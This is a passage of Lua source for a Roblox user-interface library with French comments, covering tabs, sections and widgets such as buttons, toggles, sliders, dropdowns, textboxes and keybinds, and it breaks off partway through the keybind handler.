    if not window or not anchor or not popup or not popup.Visible then
        return
    end

    local rootPos = window.Gui.AbsolutePosition
    local anchorPos = anchor.AbsolutePosition
    local anchorSize = anchor.AbsoluteSize
    local rootSize = window.Gui.AbsoluteSize

    local width = math.max(anchorSize.X, 220)
    local height = math.min(
        popup.AbsoluteSize.Y > 0 and popup.AbsoluteSize.Y or Library.Settings.DropdownMaxHeight,
        Library.Settings.DropdownMaxHeight
    )

    local x = anchorPos.X - rootPos.X
    local y = anchorPos.Y - rootPos.Y + anchorSize.Y + 4

    if x + width > rootSize.X - 8 then
        x = math.max(8, rootSize.X - width - 8)
    end

    if y + height > rootSize.Y - 8 then
        y = math.max(8, anchorPos.Y - rootPos.Y - height - 4)
    end

    popup.Position = UDim2.fromOffset(x, y)
    popup.Size = UDim2.fromOffset(width, height)
end

--========================================================--
-- Section
--========================================================--

function SectionMethods:AddSection(config)
    return self._Tab:AddSection(config)
end

function SectionMethods:AddLabel(...)
    return self._Tab:AddLabel(...)
end

function SectionMethods:AddParagraph(...)
    return self._Tab:AddParagraph(...)
end

function SectionMethods:AddButton(...)
    return self._Tab:AddButton(...)
end

function SectionMethods:AddToggle(...)
    return self._Tab:AddToggle(...)
end

function SectionMethods:AddSlider(...)
    return self._Tab:AddSlider(...)
end

function SectionMethods:AddDropdown(...)
    return self._Tab:AddDropdown(...)
end

function SectionMethods:AddMultiDropdown(...)
    return self._Tab:AddMultiDropdown(...)
end

function SectionMethods:AddMultiButton(...)
    return self._Tab:AddMultiButton(...)
end

function SectionMethods:AddKeybind(...)
    return self._Tab:AddKeybind(...)
end

function SectionMethods:AddTextbox(...)
    return self._Tab:AddTextbox(...)
end

function SectionMethods:AddColorpicker(...)
    return self._Tab:AddColorpicker(...)
end

function SectionMethods:SetVisible(visible)
    if self._Frame then
        self._Frame.Visible = visible == true
    end
end

--========================================================--
-- Tabs / Window
--========================================================--

function WindowMethods:SelectTab(tab)
    for _, current in ipairs(self.Tabs) do
        local selected = current == tab
        current.Page.Visible = selected

        current.Button.BackgroundColor3 =
            selected and Library.Theme.AccentDark or Library.Theme.Second
        current.Button.TextColor3 =
            selected and Library.Theme.Text or Library.Theme.TextDark
        current.Button.Font =
            selected and Enum.Font.GothamBold or Enum.Font.GothamSemibold
    end

    self.ActiveTab = tab
end

function WindowMethods:MakeTab(config)
    config = config or {}

    local tabButton = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Second,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 36),
        Text = config.Name or "Tab",
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.GothamSemibold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = self.TabList,
    })

    addCorner(tabButton, 6)

    new("UIPadding", {
        PaddingLeft = UDim.new(0, 12),
        Parent = tabButton,
    })

    local page = new("Frame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 1, 0),
        Visible = false,
        Parent = self.ContentHolder,
    })

    local container = makeScrollingFrame(page)

    local tab = setmetatable({
        Window = self,
        Button = tabButton,
        Page = page,
        Container = container,
        Sections = {},
    }, TabMethods)

    table.insert(self.Tabs, tab)

    connect(tabButton.Activated, function()
        self:SelectTab(tab)
    end)

    if #self.Tabs == 1 then
        self:SelectTab(tab)
    end

    return tab
end

function TabMethods:_card(height)
    local frame = new("Frame", {
        BackgroundColor3 = Library.Theme.Second,
        BackgroundTransparency = 0,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, height),
        Parent = self.Container,
    })

    addCorner(frame, 7)
    addStroke(frame, Library.Theme.Stroke, 1, 0.28)

    return frame
end

function TabMethods:AddSection(config)
    config = config or {}

    local frame = new("Frame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 27),
        Parent = self.Container,
    })

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 3, 0, 2),
        Size = UDim2.new(1, -6, 1, -4),
        Text = config.Name or "Section",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local section = setmetatable({
        _Tab = self,
        _Frame = frame,
    }, SectionMethods)

    table.insert(self.Sections, section)
    return section
end

function TabMethods:AddLabel(text)
    local frame = self:_card(34)

    local label = new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(1, -24, 1, 0),
        Text = tostring(text or ""),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.Gotham,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    return {
        Set = function(_, value)
            label.Text = tostring(value or "")
        end,
        Destroy = function()
            frame:Destroy()
        end,
    }
end

function TabMethods:AddParagraph(title, content)
    local frame = self:_card(78)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 8),
        Size = UDim2.new(1, -24, 0, 18),
        Text = tostring(title or ""),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local body = new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 29),
        Size = UDim2.new(1, -24, 0, 42),
        Text = tostring(content or ""),
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 11,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        Parent = frame,
    })

    return {
        Set = function(_, value)
            body.Text = tostring(value or "")
        end,
    }
end

function TabMethods:AddButton(config)
    config = config or {}
    local frame = self:_card(38)
    local idleColor = Library.Theme.Second
    local hoverColor = Library.Theme.Third

    local button = new("TextButton", {
        AutoButtonColor = false,
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 1, 0),
        Text = config.Name or "Button",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = frame,
    })

    connect(button.MouseEnter, function()
        TweenService:Create(frame, TweenInfo.new(0.10), {
            BackgroundColor3 = hoverColor,
        }):Play()
        TweenService:Create(button, TweenInfo.new(0.10), {
            TextColor3 = Library.Theme.Accent,
        }):Play()
    end)

    connect(button.MouseLeave, function()
        TweenService:Create(frame, TweenInfo.new(0.10), {
            BackgroundColor3 = idleColor,
        }):Play()
        TweenService:Create(button, TweenInfo.new(0.10), {
            TextColor3 = Library.Theme.Text,
        }):Play()
    end)

    connect(button.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            TweenService:Create(frame, TweenInfo.new(0.07), {
                BackgroundColor3 = Library.Theme.AccentDark,
            }):Play()
        end
    end)

    connect(button.InputEnded, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            TweenService:Create(frame, TweenInfo.new(0.10), {BackgroundColor3 = hoverColor}):Play()
        end
    end)

    connect(button.Activated, function()
        safeCallback(config.Callback)
    end)

    return {
        Set = function(_, value)
            button.Text = tostring(value or "")
        end,
        Destroy = function()
            if frame and frame.Parent then frame:Destroy() end
        end,
    }
end

-- Plusieurs boutons dans une seule carte : 1 = pleine largeur,
-- 2 = deux colonnes, 3 = deux colonnes + un bouton pleine largeur,
-- puis la même logique par paires.
function TabMethods:AddMultiButton(config)
    config = config or {}
    local buttons = config.Buttons or config
    if type(buttons) ~= "table" then return {} end
    if config.Name and config.Callback then buttons = {config} end
    if #buttons == 0 then return {} end
    if #buttons == 1 then return self:AddButton(buttons[1]) end

    local rows = math.ceil(#buttons / 2)
    local rowHeight, gap, topInset = 30, 5, 7
    local frameHeight = topInset + rows * rowHeight + math.max(0, rows - 1) * gap + 7
    local frame = self:_card(frameHeight)
    local result = {}

    for i, item in ipairs(buttons) do
        item = type(item) == "table" and item or {Name = tostring(item)}
        local isOddLast = (#buttons % 2 == 1 and i == #buttons and #buttons > 1)
        local row = math.floor((i - 1) / 2) + 1
        local position, size
        if isOddLast then
            row = rows
            position = UDim2.new(0, 10, 0, topInset + (row - 1) * (rowHeight + gap))
            size = UDim2.new(1, -20, 0, rowHeight)
        else
            local column = ((i - 1) % 2)
            position = UDim2.new(column * 0.5, column == 0 and 10 or 3, 0, topInset + (row - 1) * (rowHeight + gap))
            size = UDim2.new(0.5, column == 0 and -13 or -13, 0, rowHeight)
        end

        local button = new("TextButton", {
            AutoButtonColor = false,
            BackgroundColor3 = Library.Theme.Main,
            BorderSizePixel = 0,
            Position = position,
            Size = size,
            Text = tostring(item.Name or ("Button " .. i)),
            TextColor3 = Library.Theme.Text,
            Font = Enum.Font.GothamSemibold,
            TextSize = 12,
            TextTruncate = Enum.TextTruncate.AtEnd,
            Parent = frame,
        })
        addCorner(button, 6)
        addStroke(button, Library.Theme.Stroke, 1, 0.35)

        connect(button.MouseEnter, function()
            TweenService:Create(button, TweenInfo.new(0.10), {
                BackgroundColor3 = Library.Theme.Third,
                TextColor3 = Library.Theme.Accent,
            }):Play()
        end)
        connect(button.MouseLeave, function()
            TweenService:Create(button, TweenInfo.new(0.10), {
                BackgroundColor3 = Library.Theme.Main,
                TextColor3 = Library.Theme.Text,
            }):Play()
        end)
        connect(button.InputBegan, function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                TweenService:Create(button, TweenInfo.new(0.06), {
                    BackgroundColor3 = Library.Theme.AccentDark,
                }):Play()
            end
        end)
        connect(button.Activated, function()
            safeCallback(item.Callback)
        end)
        result[i] = {
            Set = function(_, value) button.Text = tostring(value or "") end,
            Destroy = function() if button and button.Parent then button:Destroy() end end,
        }
    end
    return result
end

function TabMethods:AddToggle(config)
    config = config or {}

    local value = config.Default == true
    local frame = self:_card(40)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(1, -70, 1, 0),
        Text = config.Name or "Toggle",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local switch = new("Frame", {
        BackgroundColor3 = value and (config.Color or Library.Theme.Accent) or Library.Theme.Divider,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -50, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0, 38, 0, 22),
        Parent = frame,
    })
    addCorner(switch, 11)

    local knob = new("Frame", {
        BackgroundColor3 = Color3.fromRGB(246, 246, 248),
        BorderSizePixel = 0,
        Size = UDim2.new(0, 18, 0, 18),
        Position = value
            and UDim2.new(1, -20, 0.5, 0)
            or UDim2.new(0, 2, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Parent = switch,
    })
    addCorner(knob, 9)

    local click = new("TextButton", {
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 1, 0),
        Text = "",
        Parent = frame,
    })

    local api = {
        Value = value,
        Type = "Toggle",
    }

    local function render(instant)
        local targetColor =
            value and (config.Color or Library.Theme.Accent) or Library.Theme.Divider
        local targetPosition =
            value
            and UDim2.new(1, -20, 0.5, 0)
            or UDim2.new(0, 2, 0.5, 0)

        if instant then
            switch.BackgroundColor3 = targetColor
            knob.Position = targetPosition
        else
            TweenService:Create(switch, TweenInfo.new(0.12), {
                BackgroundColor3 = targetColor,
            }):Play()

            TweenService:Create(knob, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {
                Position = targetPosition,
            }):Play()
        end
    end

    function api:Set(newValue)
        value = newValue == true
        api.Value = value
        render(false)
        safeCallback(config.Callback, value)
    end

    connect(click.Activated, function()
        api:Set(not value)
    end)

    if config.Flag then
        Library.Flags[config.Flag] = api
    end

    render(true)
    safeCallback(config.Callback, value)

    return api
end

function TabMethods:AddSlider(config)
    config = config or {}

    local minValue = tonumber(config.Min) or 0
    local maxValue = tonumber(config.Max) or 100
    local increment = tonumber(config.Increment) or 1

    if minValue > maxValue then
        minValue, maxValue = maxValue, minValue
    end

    local value = snap(
        tonumber(config.Default) or minValue,
        minValue,
        maxValue,
        increment
    )

    local frame = self:_card(72)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 7),
        Size = UDim2.new(0.55, 0, 0, 20),
        Text = config.Name or "Slider",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local valueBox = new("TextBox", {
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -112, 0, 6),
        Size = UDim2.new(0, 98, 0, 24),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.Gotham,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Right,
        ClearTextOnFocus = false,
        Parent = frame,
    })
    addCorner(valueBox, 5)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(1, -112, 0, 29),
        Size = UDim2.new(0, 98, 0, 12),
        Text = "Double-clic pour saisir",
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 8,
        TextXAlignment = Enum.TextXAlignment.Right,
        Parent = frame,
    })

    local bar = new("Frame", {
        BackgroundColor3 = Library.Theme.Divider,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 12, 0, 48),
        Size = UDim2.new(1, -24, 0, 9),
        Parent = frame,
    })
    addCorner(bar, 5)

    local fill = new("Frame", {
        BackgroundColor3 = config.Color or Library.Theme.Accent,
        BorderSizePixel = 0,
        Size = UDim2.new(0, 0, 1, 0),
        Parent = bar,
    })
    addCorner(fill, 5)

    local knob = new("Frame", {
        BackgroundColor3 = Color3.fromRGB(245, 245, 248),
        BorderSizePixel = 0,
        Size = UDim2.new(0, 14, 0, 14),
        AnchorPoint = Vector2.new(0.5, 0.5),
        Parent = bar,
    })
    addCorner(knob, 7)

    local hit = new("TextButton", {
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 1, 0),
        Text = "",
        Parent = bar,
    })

    local api = {
        Value = value,
        Type = "Slider",
    }

    local dragging = false
    local lastClick = 0

    local function render(instant)
        local alpha = maxValue == minValue and 0
            or math.clamp((value - minValue) / (maxValue - minValue), 0, 1)

        local fillTarget = UDim2.new(alpha, 0, 1, 0)
        local knobTarget = UDim2.new(alpha, 0, 0.5, 0)

        if instant then
            fill.Size = fillTarget
            knob.Position = knobTarget
        else
            TweenService:Create(
                fill,
                TweenInfo.new(Library.Settings.SliderTweenTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {Size = fillTarget}
            ):Play()

            TweenService:Create(
                knob,
                TweenInfo.new(Library.Settings.SliderTweenTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {Position = knobTarget}
            ):Play()
        end

        valueBox.Text = tostring(value) -- .. tostring(config.ValueName or "")
    end

    local function setValue(newValue, fire, allowBeyondMax)
        local numeric = tonumber(newValue) or minValue
        if allowBeyondMax then
            -- La barre reste bornée visuellement, mais la valeur réelle peut dépasser Max.
            -- Utile si le jeu utilise une valeur supérieure à la plage du slider.
            increment = tonumber(increment) or 1
            if increment > 0 then
                numeric = minValue + math.floor(((numeric - minValue) / increment) + 0.5) * increment
            end
            value = math.max(minValue, numeric)
        else
            value = snap(numeric, minValue, maxValue, increment)
        end
        api.Value = value
        render(false)

        if fire then
            safeCallback(config.Callback, value)
        end
    end

    local function setFromMouse(x)
        local alpha = math.clamp(
            (x - bar.AbsolutePosition.X) / math.max(bar.AbsoluteSize.X, 1),
            0,
            1
        )

        setValue(
            minValue + (maxValue - minValue) * alpha,
            true
        )
    end

    function api:Set(newValue, silent)
        -- Set/API and input clavier reflètent la valeur réelle, même si elle dépasse Max.
        setValue(tonumber(newValue) or minValue, not (silent == true), true)
    end

    connect(hit.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            setFromMouse(input.Position.X)
        end
    end)

    connect(UserInputService.InputChanged, function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            setFromMouse(input.Position.X)
        end
    end)

    connect(UserInputService.InputEnded, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    connect(valueBox.InputBegan, function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
            return
        end

        local now = os.clock()
        if now - lastClick <= 0.30 then
            valueBox:CaptureFocus()
            valueBox.CursorPosition = #valueBox.Text + 1
        end
        lastClick = now
    end)

    connect(valueBox.FocusLost, function()
        local numeric = tonumber(valueBox.Text)
        if numeric then
            setValue(numeric, true, true)
        else
            render(true)
        end
    end)

    if config.Flag then
        Library.Flags[config.Flag] = api
    end

    render(true)
    if config.FireOnInit ~= false then
        safeCallback(config.Callback, value)
    end

    return api
end

function TabMethods:AddDropdown(config)
    config = config or {}
    local multi = config.MultiSelect == true
    local options = type(config.Options) == "table" and config.Options or {}
    local value

    if multi then
        value = {}
        local defaults = type(config.Default) == "table" and config.Default or {}
        for _, option in ipairs(options) do
            if hasOption(defaults, option) then table.insert(value, option) end
        end
    else
        value = resolveOption(options, config.Default)
    end

    local frame = self:_card(44)
    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(0.40, 0, 1, 0),
        Text = config.Name or (multi and "Multi Dropdown" or "Dropdown"),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local function displayValue(input)
        local text
        if multi then
            text = #input > 0 and table.concat(input, ", ") or "Aucun choix"
        else
            text = tostring(input or (#options == 0 and "Aucune option" or ""))
        end
        if #text > 34 then text = text:sub(1, 31) .. "..." end
        return text
    end

    local button = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(0.40, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0.60, -12, 0, 32),
        Text = displayValue(value),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.Gotham,
        TextSize = 12,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = frame,
    })
    addCorner(button, 6)
    addStroke(button, Library.Theme.Stroke, 1, 0.2)
    new("UIPadding", {
        PaddingLeft = UDim.new(0, 10),
        PaddingRight = UDim.new(0, 25),
        Parent = button,
    })
    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(1, -22, 0, 0),
        Size = UDim2.new(0, 18, 1, 0),
        Text = "▾",
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        Parent = button,
    })

    local popup = new("Frame", {
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Visible = false,
        ZIndex = 1000,
        Parent = makePopupHost(self.Window),
    })
    addCorner(popup, 7)
    addStroke(popup, Library.Theme.Stroke, 1, 0)

    local list = new("ScrollingFrame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 5, 0, 5),
        Size = UDim2.new(1, -10, 1, -10),
        CanvasSize = UDim2.new(),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        ScrollBarThickness = 5,
        ScrollBarImageColor3 = Library.Theme.Accent,
        ScrollingDirection = Enum.ScrollingDirection.Y,
        Active = true,
        ZIndex = 1001,
        Parent = popup,
    })
    new("UIListLayout", {
        Padding = UDim.new(0, 3),
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = list,
    })

    local api = {
        Value = value,
        Options = options,
        Type = multi and "MultiDropdown" or "Dropdown",
    }
    self.Window.Dropdowns = self.Window.Dropdowns or {}
    table.insert(self.Window.Dropdowns, popup)

    local function position()
        positionPopup(self.Window, button, popup)
    end

    local function rebuild()
        for _, child in ipairs(list:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end

        for _, option in ipairs(api.Options) do
            local selected = multi and hasOption(api.Value, option) or option == api.Value
            local optionText = multi
                and ((selected and "☑  " or "☐  ") .. tostring(option))
                or tostring(option)
            local optionButton = new("TextButton", {
                AutoButtonColor = false,
                BackgroundColor3 = selected and Library.Theme.AccentDark or Library.Theme.Second,
                BorderSizePixel = 0,
                Size = UDim2.new(1, -2, 0, Library.Settings.DropdownRowHeight),
                Text = optionText,
                TextColor3 = Library.Theme.Text,
                Font = selected and Enum.Font.GothamBold or Enum.Font.Gotham,
                TextSize = 12,
                TextXAlignment = Enum.TextXAlignment.Left,
                TextTruncate = Enum.TextTruncate.AtEnd,
                ZIndex = 1002,
                Parent = list,
            })
            addCorner(optionButton, 5)
            new("UIPadding", {
                PaddingLeft = UDim.new(0, 10),
                PaddingRight = UDim.new(0, 8),
                Parent = optionButton,
            })
            connect(optionButton.MouseEnter, function()
                if optionButton.Parent then optionButton.BackgroundColor3 = Library.Theme.AccentDark end
            end)
            connect(optionButton.MouseLeave, function()
                if optionButton.Parent then
                    local isSelected = multi and hasOption(api.Value, option) or option == api.Value
                    optionButton.BackgroundColor3 = isSelected and Library.Theme.AccentDark or Library.Theme.Second
                end
            end)
            connect(optionButton.Activated, function()
                if multi then
                    local nextValues = table.clone(api.Value)
                    local foundIndex
                    for index, selectedValue in ipairs(nextValues) do
                        if selectedValue == option then foundIndex = index break end
                    end
                    if foundIndex then
                        table.remove(nextValues, foundIndex)
                    else
                        table.insert(nextValues, option)
                    end
                    api:Set(nextValues)
                    popup.Visible = true
                    task.defer(function() if popup.Visible then position() end end)
                else
                    api:Set(option)
                    popup.Visible = true -- comportement d'origine conservé
                    task.defer(function() if popup.Visible then position() end end)
                end
            end)
        end

        local height = math.min(
            Library.Settings.DropdownMaxHeight,
            math.max(48, (#api.Options * Library.Settings.DropdownRowHeight) + 10)
        )
        popup.Size = UDim2.fromOffset(math.max(button.AbsoluteSize.X, 220), height)
        position()
    end

    function api:Set(newValue)
        if multi then
            local requested = type(newValue) == "table" and newValue or (newValue ~= nil and {newValue} or {})
            local filtered = {}
            for _, option in ipairs(api.Options) do
                if hasOption(requested, option) then table.insert(filtered, option) end
            end
            api.Value = filtered
            button.Text = displayValue(filtered)
            rebuild()
            safeCallback(config.Callback, table.clone(filtered))
        else
            api.Value = resolveOption(api.Options, newValue)
            button.Text = displayValue(api.Value)
            rebuild()
            safeCallback(config.Callback, api.Value)
        end
    end

    function api:Refresh(newOptions, keepValue)
        api.Options = type(newOptions) == "table" and newOptions or {}
        if multi then
            local oldValues = keepValue and api.Value or (type(config.Default) == "table" and config.Default or {})
            local filtered = {}
            for _, option in ipairs(api.Options) do
                if hasOption(oldValues, option) then table.insert(filtered, option) end
            end
            api.Value = filtered
        elseif not keepValue or not hasOption(api.Options, api.Value) then
            api.Value = api.Options[1]
        end
        button.Text = displayValue(api.Value)
        rebuild()
    end

    connect(button.Activated, function()
        closeOtherDropdowns(self.Window, popup)
        popup.Visible = not popup.Visible
        if popup.Visible then rebuild(); position() end
    end)

    connect(UserInputService.InputEnded, function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
        if not popup.Visible then return end
        task.defer(function()
            if not popup.Visible then return end
            local pointer = input.UserInputType == Enum.UserInputType.Touch and input.Position or UserInputService:GetMouseLocation()
            local popupPos, popupSize = popup.AbsolutePosition, popup.AbsoluteSize
            local buttonPos, buttonSize = button.AbsolutePosition, button.AbsoluteSize
            local insidePopup = pointer.X >= popupPos.X and pointer.X <= popupPos.X + popupSize.X and pointer.Y >= popupPos.Y and pointer.Y <= popupPos.Y + popupSize.Y
            local insideButton = pointer.X >= buttonPos.X and pointer.X <= buttonPos.X + buttonSize.X and pointer.Y >= buttonPos.Y and pointer.Y <= buttonPos.Y + buttonSize.Y
            if not insidePopup and not insideButton then popup.Visible = false end
        end)
    end)

    connect(self.Window.Gui:GetPropertyChangedSignal("AbsolutePosition"), function() if popup.Visible then position() end end)
    connect(self.Window.Gui:GetPropertyChangedSignal("AbsoluteSize"), function() if popup.Visible then position() end end)

    if config.Flag then Library.Flags[config.Flag] = api end
    rebuild()
    return api
end

function TabMethods:AddMultiDropdown(config)
    config = type(config) == "table" and table.clone(config) or {}
    config.MultiSelect = true
    return self:AddDropdown(config)
end

function TabMethods:AddTextbox(config)
    config = config or {}
    local frame = self:_card(44)
    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(0.40, 0, 1, 0),
        Text = config.Name or "Textbox",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = frame,
    })

    local fullText = tostring(config.Default or "")
    local box = new("TextBox", {
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(0.40, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0.60, -12, 0, 32),
        Text = fullText,
        PlaceholderText = tostring(config.PlaceholderText or ""),
        TextColor3 = Library.Theme.Text,
        PlaceholderColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 12,
        TextXAlignment = Enum.TextXAlignment.Left,
        ClearTextOnFocus = config.TextDisappear == true,
        Parent = frame,
    })
    addCorner(box, 6)
    addStroke(box, Library.Theme.Stroke, 1, 0.2)
    new("UIPadding", {
        PaddingLeft = UDim.new(0, 9),
        PaddingRight = UDim.new(0, 9),
        Parent = box,
    })

    local api = {Value = fullText, Type = "Textbox"}
    local hasFocus = false
    local function previewText(text)
        text = tostring(text or "")
        local width = box.AbsoluteSize.X > 0 and box.AbsoluteSize.X or 230
        local limit = math.clamp(math.floor(width / 7), 12, 34)
        if #text <= limit then return text end
        local keep = limit - 3
        local leftCount = math.ceil(keep / 2)
        local rightCount = math.floor(keep / 2)
        if rightCount <= 0 then return text:sub(1, limit - 3) .. "..." end
        return text:sub(1, leftCount) .. "..." .. text:sub(-rightCount)
    end

    function api:Set(value, fireCallback)
        fullText = tostring(value or "")
        api.Value = fullText
        if hasFocus or config.TextDisappear == true then
            box.Text = fullText
        else
            box.Text = previewText(fullText)
        end
        if fireCallback == true then safeCallback(config.Callback, fullText) end
    end
    function api:Get()
        return fullText
    end

    connect(box:GetPropertyChangedSignal("Text"), function()
        if hasFocus then
            fullText = tostring(box.Text or "")
            api.Value = fullText
        end
    end)
    connect(box.Focused, function()
        hasFocus = true
        if config.TextDisappear ~= true then
            box.Text = fullText
            box.CursorPosition = #box.Text + 1
        end
    end)
    connect(box.FocusLost, function()
        hasFocus = false
        fullText = tostring(box.Text or "")
        api.Value = fullText
        safeCallback(config.Callback, fullText)
        if config.TextDisappear ~= true then
            box.Text = previewText(fullText)
        end
    end)

    if config.TextDisappear ~= true then
        task.defer(function()
            if box and box.Parent and not hasFocus then box.Text = previewText(fullText) end
        end)
    end
    if config.Flag then Library.Flags[config.Flag] = api end
    return api
end

function TabMethods:AddKeybind(config)
    config = config or {}
    local key = config.Default or Enum.KeyCode.Unknown
    if type(key) == "string" then key = Enum.KeyCode[key] or Enum.KeyCode.Unknown end
    if typeof(key) ~= "EnumItem" or key.EnumType ~= Enum.KeyCode then key = Enum.KeyCode.Unknown end

    local frame = self:_card(44)
    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(0.50, -8, 1, 0),
        Text = config.Name or "Keybind",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })
    local button = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(0.50, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0.50, -12, 0, 30),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamSemibold,
        TextSize = 12,
        Parent = frame,
    })
    addCorner(button, 6)
    addStroke(button, Library.Theme.Stroke, 1, 0.2)

    local listening = false
    local api = {Value = key, Key = key, Type = "Keybind"}
    local function render()
        button.Text = listening and "Appuie sur une touche..." or (key == Enum.KeyCode.Unknown and "Non assignée" or key.Name)
    end
    function api:Set(newKey)
        if type(newKey) == "string" then newKey = Enum.KeyCode[newKey] end
        if typeof(newKey) ~= "EnumItem" or newKey.EnumType ~= Enum.KeyCode then return false end
        key = newKey
        api.Value, api.Key = key, key
        listening = false
        render()
        safeCallback(config.ChangedCallback, key)
        return true
    end
    function api:Get()
        return key
    end

    connect(button.Activated, function()
        listening = true
        render()
    end)
    connect(UserInputService.InputBegan, function(input, gameProcessed)
        if listening then
            if input.KeyCode == Enum.KeyCode.Escape then
                listening = false
                render()
                return
            end
            if input.KeyCode ~= Enum.KeyCode.Unknown then api:Set(input.KeyCode) end
            return
        end
        if input.KeyCode == key and key ~= Enum.KeyCode.Unknown and (config.AllowProcessed == true or not gameProcessed) then
